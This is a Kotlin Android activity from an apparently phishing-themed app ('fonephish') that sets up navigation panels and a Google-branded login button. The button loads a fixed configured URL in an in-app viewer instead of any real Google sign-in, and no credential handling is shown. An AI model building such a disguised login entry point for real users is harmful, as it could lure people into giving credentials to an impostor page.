package com.fonephish.controller

import android.content.Intent
import android.os.Bundle
import android.view.View
import android.widget.CheckBox
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.view.GravityCompat
import androidx.core.view.isVisible
import androidx.drawerlayout.widget.DrawerLayout

class ConnectActivity : AppCompatActivity() {

    private lateinit var navPanels: LinkedHashMap<View, View>
    private lateinit var drawerLayout: DrawerLayout

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_connect)

        drawerLayout = findViewById(R.id.drawerLayout)
        val menuBtn = findViewById<View>(R.id.menuBtn)
        val homeNavBtn = findViewById<View>(R.id.homeNavBtn)
        val leaderboardNavBtn = findViewById<View>(R.id.leaderboardNavBtn)
        val aboutNavBtn = findViewById<View>(R.id.aboutNavBtn)
        val homePanel = findViewById<View>(R.id.homePanel)
        val leaderboardsPanel = findViewById<View>(R.id.leaderboardsPanel)
        val aboutPanel = findViewById<View>(R.id.aboutPanel)
        val tosCheckbox = findViewById<CheckBox>(R.id.tosCheckbox)
        val googleLoginBtn = findViewById<View>(R.id.googleLoginBtn)
        val altLoginBtn = findViewById<View>(R.id.altLoginBtn)
        val heroLeaderboardBtn = findViewById<View>(R.id.heroLeaderboardBtn)
        val heroAboutBtn = findViewById<View>(R.id.heroAboutBtn)

        navPanels = linkedMapOf(
            homeNavBtn to homePanel,
            leaderboardNavBtn to leaderboardsPanel,
            aboutNavBtn to aboutPanel
        )

        menuBtn.setOnClickListener {
            drawerLayout.openDrawer(GravityCompat.START)
        }

        navPanels.keys.forEach { button ->
            button.setOnClickListener { selectPanel(button.id) }
        }

        heroLeaderboardBtn.setOnClickListener { selectPanel(R.id.leaderboardNavBtn) }
        heroAboutBtn.setOnClickListener { selectPanel(R.id.aboutNavBtn) }

        googleLoginBtn.setOnClickListener {
            if (!tosCheckbox.isChecked) {
                Toast.makeText(this, R.string.must_accept_terms, Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }

            startActivity(
                Intent(this, ViewerActivity::class.java)
                    .putExtra(ViewerActivity.EXTRA_URL, ControllerConfig.FIXED_ENDPOINT)
            )
        }

        altLoginBtn.setOnClickListener {
            Toast.makeText(this, R.string.login_unavailable, Toast.LENGTH_SHORT).show()
        }

        selectPanel(R.id.homeNavBtn)
    }

    private fun selectPanel(selectedButtonId: Int) {
        navPanels.forEach { (button, panel) ->
            val isSelected = button.id == selectedButtonId
            button.isSelected = isSelected
            panel.isVisible = isSelected
        }
        drawerLayout.closeDrawer(GravityCompat.START)
    }
}
